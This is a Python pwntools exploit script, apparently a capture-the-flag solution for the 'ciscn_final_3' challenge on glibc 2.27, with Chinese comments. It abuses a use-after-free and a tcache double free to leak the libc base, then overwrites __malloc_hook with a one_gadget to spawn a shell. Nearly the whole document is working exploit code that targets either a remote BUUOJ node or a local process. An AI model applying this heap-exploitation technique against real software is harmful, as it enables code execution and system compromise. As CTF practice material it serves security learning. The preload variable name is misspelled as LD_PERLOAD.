from pwn import *

'''
libc2.27
提供add和remove两种操作
add之后会告诉你chunk地址
free了但是没有置零，所以存在UAF。并且这是2.27版本，所以还存在tcache中的duble free

❯ one_gadget ./libc.so.6
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
context(os = "linux", arch = "amd64")
context(log_level = "debug")

libc = ELF('./libc.so.6')

if args.REMOTE:
    p = remote('node4.buuoj.cn', 27792)
else:
    context.terminal = ["tmux", "splitw", "-h"]
    p = process('./ciscn_final_3', env={'LD_PERLOAD': './libc.so.6'})
    gdb.attach(p)

def add(index: int, size: int, content: bytes):
    p.sendlineafter(b'choice > ', b'1')
    p.sendlineafter(b'index\n', str(index).encode())
    p.sendlineafter(b'size\n', str(size).encode())
    p.sendlineafter(b'something\n', content)
    p.recvuntil(b'gift :')
    return int(p.recv(14).decode(), 16)

def remove(index: int):
    p.sendlineafter(b'choice > ', b'2')
    p.sendlineafter(b'index\n', str(index).encode())

heap = add(0, 0x78, b'a') #0
# p.info("heap: "+hex(heap))
add(1, 0x18, b'b') #1
add(2, 0x78, b'c') #2
add(3, 0x78, b'd') #3
add(4, 0x78, b'c') #4
add(5, 0x78, b'd') #5 
add(6, 0x78, b'c') #6
add(7, 0x78, b'd') #7 
add(8, 0x78, b'c') #8
# ======= 0x421 chunk to here ========
add(9, 0x78, b'd') #9 
add(10, 0x78, b'c') #10
add(11, 0x78, b'd') #11
add(12, 0x28, b'd') #12

# double free, create tcache dup
remove(12)
remove(12)

add(13, 0x28, p64(heap-0x10)) # tcache bin won't check the size of the chunk. so we don't have to find the '0x7f' or other value in memory
add(14, 0x28, p64(heap-0x10))

# make overlap, modify the size of chunk 0 to 0x420
add(15, 0x28, p64(0) + p64(0x421))

remove(0) # send chunk 0 to unsorted bin
remove(1) # send chunk 1 to tcache bin
add(16, 0x78, b'a') # move main_arena pointer to chunk 1
add(17, 0x18, b'a')
main_arena = add(18, 0x18, b'a') - 0x60
malloc_hook = main_arena - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
one_gadget = libc_base + 0x10a38c # 0x4f322 不行

p.success("got libc base: "+hex(libc_base))
p.success("cal onegadget: "+hex(one_gadget))

# dup again
remove(5)
remove(5)
add(19, 0x78, p64(malloc_hook))
add(20, 0x78, p64(malloc_hook))
add(21, 0x78, p64(one_gadget))

# trigger malloc & get shell
p.sendlineafter(b'choice > ', b'1')
p.sendlineafter(b'index\n', b'22')
p.sendlineafter(b'size\n', b'0')

p.interactive()
